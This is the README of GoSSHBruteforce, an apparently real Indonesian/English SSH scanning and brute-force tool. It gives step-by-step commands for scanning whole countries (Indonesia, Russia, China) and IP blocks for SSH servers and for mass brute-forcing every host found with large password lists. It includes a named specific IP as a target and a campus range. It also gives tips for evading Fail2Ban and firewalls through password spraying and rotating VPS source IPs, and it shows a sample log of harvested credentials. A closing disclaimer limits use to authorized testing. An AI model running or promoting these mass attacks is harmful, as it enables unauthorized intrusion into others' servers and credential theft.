# GoSSHBruteforce 🔥

[![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=flat&logo=go)](https://golang.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Author](https://img.shields.io/badge/Author-b2hunters.id-red.svg)](https://github.com/GhostlyrootB2H)

**Advanced SSH Scanner & Bruteforce Tool**  
*Tools canggih untuk scanning dan bruteforce SSH*

---

## 📋 **Daftar Isi | Table of Contents**
- [Fitur Utama | Key Features](#fitur-utama--key-features)
- [Instalasi | Installation](#instalasi--installation)
- [Parameter Lengkap | Complete Parameters](#parameter-lengkap--complete-parameters)
- [Penjelasan Fitur | Features Explanation](#penjelasan-fitur--features-explanation)
- [Contoh Penggunaan | Examples](#contoh-penggunaan--examples)
- [Tips & Trik | Tips & Tricks](#tips--trik--tips--tricks)
- [Hasil Bruteforce | Bruteforce Results](#hasil-bruteforce--bruteforce-results)
- [Troubleshooting](#troubleshooting)
- [Peringatan | Warning](#peringatan--warning)
- [Lisensi | License](#lisensi--license)

---

## 🚀 **Fitur Utama | Key Features**

### **🇮🇩 Bahasa Indonesia**
| Fitur | Deskripsi |
|-------|-----------|
| **Scan IP Range** | Scan jutaan IP untuk mencari server SSH yang terbuka (port 22) |
| **Scan per Negara** | Scan IP berdasarkan negara (Indonesia, Rusia, China, dll) |
| **Bruteforce SSH** | Multi-threaded SSH bruteforce dengan kecepatan tinggi |
| **Mass Bruteforce** | Serang ribuan target sekaligus dari file hasil scan |
| **Custom Wordlist** | Gunakan file username dan password sendiri |
| **Auto-Save Results** | Semua credential berhasil otomatis tersimpan |
| **Progress Bar** | Monitor real-time proses bruteforce |
| **Stealth Mode** | Bisa diatur agar tidak terdeteksi firewall |

### **🇬🇧 English**
| Feature | Description |
|---------|-------------|
| **IP Range Scan** | Scan millions of IPs for open SSH servers (port 22) |
| **Country Scan** | Scan IPs by country (Indonesia, Russia, China, etc.) |
| **SSH Bruteforce** | Multi-threaded SSH bruteforce with high speed |
| **Mass Bruteforce** | Attack thousands of targets from scan results file |
| **Custom Wordlist** | Use your own username and password files |
| **Auto-Save Results** | All successful credentials are automatically saved |
| **Progress Bar** | Real-time monitoring of bruteforce process |
| **Stealth Mode** | Configurable to avoid firewall detection |

---

## 📦 **Instalasi | Installation**

### **🇮🇩 Bahasa Indonesia**

#### **Persyaratan Sistem**
- **OS:** Linux (Ubuntu/Debian/Kali)
- **Go:** Versi 1.22 atau lebih baru
- **Masscan:** Untuk scanning IP (akan diinstall otomatis)

> **📌 CATATAN PENTING:**  
> Jika Go version Anda di bawah 1.22, proses build akan mendownload Go 1.25 secara otomatis (sekitar 140MB). Ini hanya terjadi **SATU KALI** dan akan memakan waktu 5-30 menit tergantung koneksi.

#### **Langkah Instalasi**

```bash
# 1. Clone repository
git clone https://github.com/GhostlyrootB2H/GoSSHBruteforce.git
cd GoSSHBruteforce

# 2. Install dependencies (masscan)
chmod +x scripts/install_deps.sh
sudo ./scripts/install_deps.sh

# 3. Build tools
go build -o gosshtool cmd/gosshtool/main.go

# 4. Tes apakah berhasil
./gosshtool -h

### **Estimasi Waktu Instalasi**
| Skenario | Waktu | Keterangan |
|----------|-------|------------|
| Go ≥ 1.22 | 2-5 menit | Normal, hanya download dependencies |
| Go < 1.22 | 5-30 menit | Download Go 1.25 (140MB) + dependencies |

---

# 🎯 **Parameter Lengkap | Complete Parameters**

### 🇮🇩 Bahasa Indonesia
| Parameter | Fungsi | Contoh |
|-----------|--------|--------|
| `-range` | Scan IP range (CIDR) | `-range 103.0.0.0/8` |
| `-country` | Scan per negara | `-country id` |
| `-L` | File daftar target | `-L targets.txt` |
| `-U` | File username | `-U users.txt` |
| `-P` | File password | `-P passwords.txt` |
| `-t` | Jumlah thread | `-t 50` |
| `-rate` | Kecepatan scan (packet/detik) | `-rate 50000` |
| `-output` | Folder hasil | `-output ./hasil` |
| `-no-scan` | Lewati scanning, langsung bruteforce | `-no-scan` |

### 🇬🇧 English
| Parameter | Function | Example |
|-----------|----------|---------|
| `-range` | Scan IP range (CIDR) | `-range 103.0.0.0/8` |
| `-country` | Scan by country | `-country id` |
| `-L` | Target list file | `-L targets.txt` |
| `-U` | Username file | `-U users.txt` |
| `-P` | Password file | `-P passwords.txt` |
| `-t` | Number of threads | `-t 50` |
| `-rate` | Scan speed (packets/sec) | `-rate 50000` |
| `-output` | Output directory | `-output ./results` |
| `-no-scan` | Skip scanning, direct bruteforce | `-no-scan` |
📚 Penjelasan Fitur & Cara Penggunaan | Features Explanation & Usage
🇮🇩 Bahasa Indonesia
1. Scan IP Range
Mencari server SSH (port 22) yang hidup di suatu range IP. Hasil scan akan disimpan di results/live_hosts.txt.

Cara Penggunaan:

bash
sudo ./gosshtool -range <IP_RANGE> -rate <KECEPATAN>
Contoh:

bash
# Scan seluruh IP Indonesia (103.x.x.x)
sudo ./gosshtool -range 103.0.0.0/8 -rate 50000

# Scan range IP tertentu
sudo ./gosshtool -range 192.168.1.0/24 -rate 10000
Penjelasan:

-range 103.0.0.0/8 = Scan semua IP yang diawali 103

-rate 50000 = Kirim 50.000 packet per detik (makin tinggi makin cepet)

Hasil scan tersimpan di results/live_hosts.txt dengan format IP:22

2. Scan by Country
Scan IP berdasarkan negara. Data IP range per negara sudah disediakan di folder data/country_ranges/.

Cara Penggunaan:

bash
sudo ./gosshtool -country <KODE_NEGARA> -rate <KECEPATAN>
Contoh:

bash
# Scan Indonesia
sudo ./gosshtool -country id -rate 50000

# Scan Rusia
sudo ./gosshtool -country ru -rate 50000

# Scan China
sudo ./gosshtool -country cn -rate 50000
Kode Negara yang Tersedia:

Kode	Negara	Kode	Negara
id	Indonesia	jp	Japan
ru	Russia	kr	South Korea
cn	China	vn	Vietnam
us	USA	th	Thailand
my	Malaysia	sg	Singapore
in	India	br	Brazil
mx	Mexico	ph	Philippines
3. Bruteforce Single Target
Mencoba kombinasi username dan password ke satu target spesifik.

Cara Penggunaan:

bash
# Buat file target dulu
echo "<IP>:<PORT>" > target.txt

# Jalankan bruteforce
./gosshtool -no-scan -L target.txt -U <FILE_USER> -P <FILE_PASS> -t <THREAD>
Contoh:

bash
# Buat target dengan port 22
echo "192.168.1.1:22" > target.txt

# Bruteforce dengan wordlist default
./gosshtool -no-scan -L target.txt -t 50

# Bruteforce dengan custom wordlist
./gosshtool -no-scan -L target.txt -U data/usernames.txt -P data/passwords.txt -t 100
4. Mass Bruteforce
Menyerang ribuan target sekaligus dari file hasil scan.

Cara Penggunaan:

bash
# Step 1: Scan dulu untuk dapat target
sudo ./gosshtool -country id -rate 50000

# Step 2: Bruteforce semua hasil scan
./gosshtool -no-scan -L results/live_hosts.txt -U <USERLIST> -P <PASSLIST> -t <THREAD>
Contoh:

bash
# Scan Indonesia
sudo ./gosshtool -country id -rate 50000

# Bruteforce semua server Indonesia yang ketemu
./gosshtool -no-scan -L results/live_hosts.txt -U data/usernames.txt -P data/passwords.txt -t 100
5. Custom Wordlist
Menggunakan file username dan password sendiri (bukan default).

Lokasi Wordlist Default:

data/usernames.txt - Username default (root, admin, user, dll)

data/passwords.txt - Password default (root, admin, 123456, dll)

Cara Menggunakan Wordlist Sendiri:

bash
./gosshtool -no-scan -L target.txt -U /path/to/username.txt -P /path/to/password.txt -t 50
Contoh dengan RockYou (Wordlist 14 Juta Password):

bash
# Install rockyou dulu
sudo apt install seclists -y
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Gunakan rockyou
./gosshtool -no-scan -L results/live_hosts.txt -U data/usernames.txt -P /usr/share/wordlists/rockyou.txt -t 100
6. Kombinasi dengan Port Alternatif
Banyak server menggunakan port SSH alternatif (bukan 22) seperti port 26, 2222, 22222.

Cara Penggunaan:

bash
# Buat file target dengan port spesifik
echo "101.255.167.210:26" > router.txt

# Bruteforce
./gosshtool -no-scan -L router.txt -U data/usernames.txt -P data/passwords.txt -t 30
🇬🇧 English
1. IP Range Scan
Find live SSH servers (port 22) in an IP range. Results saved in results/live_hosts.txt.

Usage:

bash
sudo ./gosshtool -range <IP_RANGE> -rate <SPEED>
Example:

bash
# Scan all Indonesian IPs (103.x.x.x)
sudo ./gosshtool -range 103.0.0.0/8 -rate 50000
2. Country Scan
Scan IPs by country. Country IP ranges are in data/country_ranges/.

Usage:

bash
sudo ./gosshtool -country <CODE> -rate <SPEED>
Example:

bash
sudo ./gosshtool -country id -rate 50000  # Scan Indonesia
sudo ./gosshtool -country ru -rate 50000  # Scan Russia
3. Single Target Bruteforce
Try username/password combinations on one target.

Usage:

bash
echo "<IP>:<PORT>" > target.txt
./gosshtool -no-scan -L target.txt -U <USERFILE> -P <PASSFILE> -t <THREADS>
4. Mass Bruteforce
Attack thousands of targets from scan results.

Usage:

bash
# Step 1: Scan for targets
sudo ./gosshtool -country id -rate 50000

# Step 2: Bruteforce all results
./gosshtool -no-scan -L results/live_hosts.txt -t 100
💡 Tips & Trik | Tips & Tricks
🇮🇩 Bahasa Indonesia
Agar Tidak Terdeteksi Firewall
Gunakan Thread yang Wajar (10-20 thread)

bash
./gosshtool -no-scan -L target.txt -t 15
Gunakan Password Spraying
Coba 1 password ke banyak user, bukan banyak password ke 1 user. Ini menghindari deteksi Fail2Ban.

Atur Delay yang Variatif
Tools ini sudah menggunakan random delay 1-3 detik per percobaan.

Gunakan Port Alternatif
Coba port 26, 2222, 22222 (banyak admin pindah port biar aman).

Rotasi IP Sumber
Jika punya banyak VPS, distribusikan serangan ke banyak IP.

Mempercepat Bruteforce
Gunakan Wordlist Besar (RockYou) - 14 juta password

Tambah Thread Bertahap: 20 → 50 → 100

Gunakan Banyak Target (100 target dengan 10 thread = cepat)

Analisis Hasil
Dari output tools:

Attempts: Jumlah percobaan login

Success: Jumlah credential berhasil

Rate: Kecepatan percobaan/detik

Elapsed: Waktu sudah berjalan

🇬🇧 English
To Avoid Firewall Detection
Use Reasonable Threads (10-20 threads)

Use Password Spraying - Try 1 password on many users

Use Varied Delays - Tool uses random 1-3 second delays

Use Alternative Ports - Try 26, 2222, 22222

Rotate Source IPs - Use multiple VPS

To Speed Up Bruteforce
Use RockYou wordlist (14 million passwords)

Increase threads gradually: 20 → 50 → 100

Use multiple targets (100 targets = fast)

💾 Hasil Bruteforce | Bruteforce Results
🇮🇩 Bahasa Indonesia
Semua credential yang berhasil ditemukan otomatis tersimpan di:

text
results/credentials_found.txt
Format File:

text
[2026-03-20 10:30:45] 103.25.14.2:22 - root:toor
[2026-03-20 10:30:47] 180.241.45.67:22 - admin:admin123
Lihat Hasil:

bash
cat results/credentials_found.txt
# atau monitor real-time
tail -f results/credentials_found.txt
🇬🇧 English
All successful credentials are saved in results/credentials_found.txt

View Results:

bash
cat results/credentials_found.txt
tail -f results/credentials_found.txt  # real-time monitor
🎯 Contoh Penggunaan Lengkap | Complete Usage Examples
🇮🇩 Bahasa Indonesia
Skenario 1: Scan Seluruh Indonesia + Bruteforce Massal
bash
# Scan semua server Indonesia
sudo ./gosshtool -country id -rate 50000

# Bruteforce semua hasil dengan RockYou
./gosshtool -no-scan -L results/live_hosts.txt -U data/usernames.txt -P /usr/share/wordlists/rockyou.txt -t 100
Skenario 2: Target Spesifik dengan Port 26 (Seperti Router)
bash
# Buat file target
echo "101.255.167.210:26" > router.txt

# Bruteforce dengan wordlist default
./gosshtool -no-scan -L router.txt -U data/usernames.txt -P data/passwords.txt -t 30
Skenario 3: Scan Multi-Negara
bash
# Scan beberapa negara
sudo ./gosshtool -country id -rate 50000
sudo ./gosshtool -country my -rate 50000
sudo ./gosshtool -country sg -rate 50000

# Gabungkan hasil
cat results/live_hosts.txt > semua_target.txt

# Bruteforce semua
./gosshtool -no-scan -L semua_target.txt -t 100 -P /usr/share/wordlists/rockyou.txt
Skenario 4: Password Spraying (Anti-Detection)
bash
# Buat file berisi 1 password
echo "admin123" > satu_password.txt

# Coba ke banyak target (10 thread biar slow)
./gosshtool -no-scan -L results/live_hosts.txt -U data/usernames.txt -P satu_password.txt -t 10
Skenario 5: Scan IP Range Tertentu + Bruteforce
bash
# Scan range IP kampus
sudo ./gosshtool -range 103.25.14.0/24 -rate 20000

# Bruteforce hasilnya
./gosshtool -no-scan -L results/live_hosts.txt -t 50
🇬🇧 English
Scenario 1: Scan Indonesia + Mass Bruteforce
bash
sudo ./gosshtool -country id -rate 50000
./gosshtool -no-scan -L results/live_hosts.txt -P /usr/share/wordlists/rockyou.txt -t 100
Scenario 2: Specific Target with Port 26
bash
echo "101.255.167.210:26" > router.txt
./gosshtool -no-scan -L router.txt -t 30
Scenario 3: Multi-Country Scan
bash
sudo ./gosshtool -country id -rate 50000
sudo ./gosshtool -country my -rate 50000
cat results/live_hosts.txt > all_targets.txt
./gosshtool -no-scan -L all_targets.txt -t 100
🔧 Troubleshooting
🇮🇩 Bahasa Indonesia
Error	Penyebab	Solusi
package crypto/ecdh is not in GOROOT	Go version < 1.22	Upgrade Go ke 1.22+
masscan: command not found	Masscan belum terinstall	sudo ./scripts/install_deps.sh
Connection refused	Target mati/port salah	Cek dengan nc -zv target.com 22
Address already in use	Terlalu banyak koneksi	Kurangi thread, tunggu 5 menit
Build lama >10 menit	Download Go 1.25	Biarkan selesai (hanya sekali)
🇬🇧 English
Error	Cause	Solution
package crypto/ecdh is not in GOROOT	Go version < 1.22	Upgrade Go to 1.22+
masscan: command not found	Masscan not installed	sudo ./scripts/install_deps.sh
Connection refused	Target down/wrong port	Check with nc -zv target.com 22
Address already in use	Too many connections	Reduce threads, wait 5 minutes
Build >10 minutes	Downloading Go 1.25	Let it finish (only once)
⚠️ Peringatan | Warning
🇮🇩 Bahasa Indonesia
TOOLS INI SANGAT BERBAHAYA JIKA DISALAHGUNAKAN!

⚠️ Ilegal: Menyerang server tanpa izin = tindak pidana

⚠️ UU ITE: Melanggar Pasal 30-32 tentang akses ilegal

⚠️ Resiko: IP masuk daftar hitam, VPS suspend, atau dipenjara

⚠️ Hanya untuk: Pengujian sistem sendiri atau dengan izin tertulis

Gunakan dengan bijak dan bertanggung jawab!

🇬🇧 English
THIS TOOL IS EXTREMELY DANGEROUS IF MISUSED!

⚠️ Illegal: Attacking servers without permission = criminal offense

⚠️ Legal Risk: Violates computer fraud laws

⚠️ Consequences: IP blacklisted, VPS suspended, or imprisonment

⚠️ For authorized use only: Testing your own systems or with written permission

📜 Lisensi | License
🇮🇩 Bahasa Indonesia
Copyright © 2026 b2hunters.id
Didistribusikan di bawah lisensi MIT.

🇬🇧 English
Copyright © 2026 b2hunters.id
Distributed under the MIT License.

👨‍💻 Author
b2hunters.id
GitHub: @GhostlyrootB2H

🇮🇩 Bahasa Indonesia
Terima kasih telah menggunakan GoSSHBruteforce!
Tools ini untuk pembelajaran dan pengujian keamanan.
Jangan gunakan untuk aktivitas ilegal!

🇬🇧 English
Thank you for using GoSSHBruteforce!
For learning and security testing only.
Do not use for illegal activities!
